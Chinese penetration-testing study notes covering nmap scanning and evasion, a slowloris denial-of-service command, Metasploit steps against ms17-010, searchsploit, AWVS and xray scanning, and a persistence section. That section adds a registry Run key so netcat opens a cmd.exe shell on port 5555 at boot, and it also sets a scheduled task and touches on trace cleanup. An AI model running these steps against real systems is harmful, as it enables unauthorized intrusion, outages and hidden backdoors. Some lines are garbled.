https://github.com/Threekiii/Awesome-Redteam
https://github.com/CnHack3r/Penetration_PoC

Web漏洞分析
* 我们要挖掘什么漏洞?
* 应该从哪里挖掘?
* 网站源码分析
* 已知源码
* 我们可以下载其源码本地分析
* 百度该源码漏洞
* 未知源码
* 黑盒测试该网站漏洞(手工、工具自动扫描)

常见漏洞扫描工具
> NMAP
> AWVS
> Appscan
> Burpsuite
> x-ray

## Nmap
主机探测(一)

* 扫描单个主机
* nmap 192.168.1.2
* 扫描整个子网,命令如下:
* nmap 192.168.1.1/24
* 扫描多个目标,命令如下:
* nmap 192.168.1.2 192.168.1.5
* 扫描一个范围内的目标,如下:
* nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)果你有的所有里税济个保存为一个txt文件,和namp在同一目录下,扫描
* nmap -iL target.txt

主机探测(二)
* 如果你想看到你扫描的所有主机的列表,用以下命令:
* nmap -sL 192.168.1.1/24
* 扫描除过某一个ip外的所有子网主机,命令:
* nmap 192.168.1.1/24-exclude 192.168.1.1
* 扫描除过某一个文件中的ip外的子网主机命令
* nmap 192.168.1.1／24 -excludefile xxx．txt(xxx．txt中的文件将
会从扫描的主机中排除)


TCP扫描 (-sT)
* 这是一种最为普通的扫描方法,这种扫描方法的特点是
* 扫描的速度快,准确性高,对操作者没有权限上的要求,
* 但是容易被防火墙和IDS(防入侵系统) 发现
* 运行的原理:通过建立TCP的三次握手连接来进行信息的传递

①Client端发送SYN;
②Server端返回SYN/ACK, 表明端口开放;
③ Client端返回ACK, 表明连接已建立;
Client端主动断开连接.



端口扫描
* 使用UDP ping探测主机:
* nmap -PU 192.168.1.0/ 24 服务版本探测
* nmap -sV 192.168.1.1
* 精准地确认端口上运行的服务
* nmap -sV --script unusual-port 192.168.1.1
* nmap -sV --script unusual-port 192.168.1.1 -p 9527


常见扫描方式
* TCP:-sT
* SYN:-sS
* ACK:-sA
* UDP:-sU
* RPC:-sR
* ICMP:-sP
disable port scan:-sn
* nmap -sn -PR 192.168.0.0/24 arp 扫描


探测目标主机的操作系统
* nmap -O 192.168.1.19
* nmap -A 192.168.1.19
* -oN导出扫描结果
* -oX导出扫描结果xml格式


nmap 信息脚本收集


| 脚本                                | 解释                          |
| ----------------------------------- | ----------------------------- |
| hostmap-ip2hosts i                  | IP反查                        |
| dns-brute                           | DNS信息搜集                   |
| membase-nttp-info                   | 检索系统信息                  |
| smb-security-mode.nse               | 后台打印机服务漏洞            |
| smb-check-vuins.nse                 | 系统漏洞扫描                  |
| http-stored-xss.nse                 | 扫描web漏洞                   |
| snmp-win32-services                 | 通过Snmp列举Windosws服务/账户 |
| dns-brute                           | 枚举DNS服务器的主机名         |
| http-headers/http-sitemap-generator | HTTP信息搜集                  |
| ssl-enum-ciphers                    | 枚举SSL密钥                   |
| ssh-hostkey                         | SSH服务密钥信息探测           |



* 对目标进行IP反查
* nmap -sn --script hostmap-ip2hosts www.hao123.com
* 对目标DNS信息的收集
* nmap --script dns-brute www.test.com
* nmap --script dns-brute dns-brute.threads=10 www.test.com
* 了解目标系统的详细信息
* nmap -p 445 192.168.23.1 --script membase-http-info


* 检查打印服务漏洞
* nmap --script smb-security-mode.nse -p 445 192.168.21.3
* 扫描目标的xss漏洞
* nmap -p80--script http-stored-xss.nse www.test.com
* 扫描目标的SQL注入漏洞
* nmap -p8001--script http-sql-injection.nse 192.168.0.200


漏洞探测
* 扫描系统漏洞
* nmap --script vuln 192.168.1.1
* IIS 短文件泄露
* nmap -p 8080--script http-iis-short-name-brute 192.168.1.1
* 拒绝服务
* nmap --max-parallelism 800--script http-slowloris www.cracer.com
* 验证http 中开启了put方法
* nmap --script http-put--script-args http-put.url=/uploads/testput.txt,http-
put.file=/root/put.txt 218.19.141.16
* 验证MySQL匿名访问
* nmap --script mysql-empty-password 203.195.139.153


防火墙躲避
* -f分片绕过
* -D使用诱饵隐蔽扫描
* NMAP -D1.1.1.1,222.222.222.222www.cracer.com
* --source-port源端口欺骗

## MSF
nmap 探测到ms17-010后
```bash
$ msfconsole
search ms17-010
use 3
set rhosts 192.168.80.100
show targets
run
```
如果失败3次以上

```
options
# 提示有 lport , 换个口试试
set lport 1122
run
```
searchsploit
."searchsploit"是一个用于Exploit-DB的命令行搜索工具,它还允许你随身带一份
Exploit-DB的副本.
* SearchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力.这种能力特
别适用于在没有互联网接入的情况下对网络进行安全评估.许多漏洞都包含了二进制文件
的链接,这些文件不包含在标准存储库中,但可以在我们的Exploit-DB二进制文件中找到
* 如果您预计您将在一个没有Internet的网络环境进行渗透测试,请确保您检查了两个存储库
以获得最完整的数据集.注意,这个工具的名称是"SearchSploit",顾名思义,它将搜
索所有的漏洞和shellcode.它不会包含任何文件和谷歌黑客数据库的结果
* 终端输入searchsploit启动(已经默认在Kali/Parrot中安装)

https://www.exploit-db.com/

```
searchsploit
searchsploit -m xxxx/xxx.py  # 复制到当前目录
searchsploit -t linux remote # 标题包含Linux Remote
searchsploit apache
```


基本搜索
* 基本搜索会同时匹配标题和路径中的内容
* 如:searchsploit smb windows remote
* 标题搜索
* 标题搜索只匹配标题,不会对路径中的关键词进行匹配
* 如:searchsploit-t smb windows remote
* 删除不想要的结果
* 使用--exclude＝选项删除不想要的结果
* 如:searchsploit smb windows remote--exclude＝＂(POC)Jtxt＂

## AWVS
Acunetix Web Vulnerability Scanner(简称AWVS)是一款知名
的网络漏洞扫描工具,它通过网络爬虫测试你的网站安全,检测流
行安全漏洞.
Acunetix推出了一个具有漏洞的测试网站
http://test.vulnweb.com/.

AWVS常见功能
* 网站爬行
* 漏洞扫描
* 目标发现
* 子域名扫描
* http 编辑
* http嗅探
* http模糊测试
* 认证测试
* 网络服务扫描器

linux 版本安装后。访问时用https://xxx:3443/

[AWVS13批量添加目标脚本](https://blog.csdn.net/weixin_45382656/article/details/118565077)

## xray
https://github.com/chaitin/xray

awvs+xray https://www.cnblogs.com/zzjdbk/p/13195955.html

```
xray webscan --basic-crawler http://example.com --html-output vuln.html
xray webscan --listen 0.0.0.0:7001 --html-output awvs.html
xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
```
### crawergo联动
https://www.freebuf.com/sectool/252790.html

```sh
crawlergo -c YourChromiumPath -t 标签页数 Url
./xray webscan --listen 127.0.0.1:7777 --html-output vulnerability.html
./crawlergo -c chrome-mac/Chromium.app/Contents/MacOS/Chromium -t 10--request-proxy http://127.0.0.1:7777 http://testphp.vulnweb.com/
```

> 如果想半⾃动化⼀点，比如测试多个url可以参考：https://github.com/timwhitez/crawlergo_x_XRAY

与 w13scan 联动：
```sh
python3 w13scan.py -s 127.0.0.1 --html   # 会监听7778
/crawlergo -c chrome-mac/Chromium.app/Contents/MacOS/Chromium -t 10 --request-proxy http://127.0.0.1:7778 http://testphp.vulnweb.com/
```

## 存在目录时，返回403响应码

# 进行权限维持
开机自启动
每次启动登录时都会按顺序自动执行.
```bash
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```
- 上传nc

upload nc.exe C:\\windows\\system32

- 查看自启动注册表项I

reg enumkey-k HKLM\\software\\microsoft\\windows\\currentversion\\un

- 添加注册表,开机启动nc并开启监听

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc-d 'C:\\windows\\system32\\nc64.exe-Ldp 5555-e cmd.exe'

- 查看注册表指定项值

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

- 计划任务

`schtasks /create /sc MINUTE /mo 1 /tr C:\Users\Administrator\Desktop\mx\5555.exe /tn test`

# 痕迹清理
[入侵痕迹清理](https://mp.weixin.qq.com/s/jki83_0x__LfWGZj2da33g)
